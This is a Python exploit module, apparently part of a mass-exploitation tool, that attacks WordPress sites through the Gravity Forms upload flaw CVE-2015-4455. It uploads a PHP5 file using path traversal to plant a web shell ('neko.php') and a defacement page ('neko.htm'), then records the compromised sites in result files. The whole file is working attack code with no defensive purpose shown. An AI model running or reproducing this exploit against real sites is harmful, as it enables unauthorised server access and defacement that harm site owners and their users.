# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        Grav_checker = requests.get('http://' + site + '/?gf_page=upload', timeout=5, headers=Headers)
        if '"status" : "error"' in str(Grav_checker.content):
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            fileDeface = {'file': open('files/grav.jpg', 'rb')}
            post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'p.php5'}
            url = "http://" + site + '/?gf_page=upload'
            GoT = requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
            if '.php5' in str(GoT.content):
                CheckShell = requests.get('http://' + site + '/wp-content/_input_3_p.php5',
                                          timeout=10, headers=Headers)
                if 'neko!!' in str(CheckShell.content):
                    Checkshell2 = requests.get('http://' + site + '/wp-content/neko.php', timeout=5,
                                               headers=Headers)
                    if 'neko!!' in str(Checkshell2.content):
                        Checkshell = requests.get('http://' + site + '/wp-content/neko.php',
                                                  timeout=10, headers=Headers)
                        CheckIndex = requests.get('http://' + site + '/neko.htm',
                                                  timeout=10, headers=Headers)
                        if 'neko!!' in str(Checkshell.content):
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/wp-content/neko.php' + '\n')
                        if 'neko!!' in str(CheckIndex.content):
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/neko.htm' + '\n')
                        return printModule.returnYes(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
                    else:
                        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
                else:
                    return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Shell', 'Wordpress')
